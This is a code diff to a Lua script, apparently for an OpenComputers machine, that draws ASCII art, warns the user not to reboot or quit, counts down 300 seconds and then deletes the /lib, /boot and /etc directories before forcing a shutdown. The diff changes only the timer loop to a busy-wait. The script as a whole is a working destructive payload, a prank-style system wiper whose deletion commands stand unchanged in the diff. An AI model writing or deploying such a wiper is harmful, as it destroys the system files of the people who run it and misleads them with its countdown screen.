@@ -18,6 +18,9 @@ gpu.setForeground(0xFFFFFF)
 
 gpu.fill(1, 1, 80, 25, " ")
 
+local seconds = 300
+local startTime = computer.uptime()
+
 os.sleep(0.3)
 gpu.set(1, 1, "░░▄▀▀▀▀▀▄░░")
 os.sleep(0.3)
@@ -45,8 +48,9 @@ gpu.set(30, 10, "2. Don't Reboot Computer")
 os.sleep(0.3)
 gpu.set(30, 12, "3. Don't leave this program")
 
-for i = 1, 300 do
-  os.sleep(1)
+
+while computer.uptime() - startTime < seconds do
+
 end
 
 fs.remove("/lib/*")
@@ -54,7 +58,3 @@ fs.remove("/boot/*")
 fs.remove("/etc/*")
 
 comp.shutdown(true)
-
-while true do
-    event.pull("touch")
-end
